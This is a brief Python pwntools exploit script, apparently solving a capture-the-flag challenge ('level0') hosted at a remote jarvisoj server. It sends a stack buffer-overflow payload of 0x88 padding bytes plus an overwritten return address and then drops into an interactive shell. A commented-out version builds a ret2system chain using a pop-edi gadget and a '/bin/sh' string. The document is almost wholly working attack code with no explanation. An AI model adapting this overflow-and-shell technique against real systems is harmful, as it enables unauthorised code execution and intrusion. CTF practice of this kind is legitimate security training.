
from pwn import *

# level0 = ELF('./level0')
# systemplt = level0.plt['system']
# print hex(systemplt)
# system = 0x400460
# #0x0000000000400663 pop edi ret
# sh = remote('pwn2.jarvisoj.com', 9881)
# padding = "A"*0x88
# addr = p64(0x400663)
# argv =  p64(0x400684)# /bin/sh
# shellcode = padding + addr + argv +p64(system)
# sh.send(shellcode)
# sh.interactive()

sh = remote('pwn2.jarvisoj.com', 9881)

padding = "A"*0x88
addr = p64(0x400596)
shellcode = padding + addr

sh.send(shellcode)
sh.interactive()
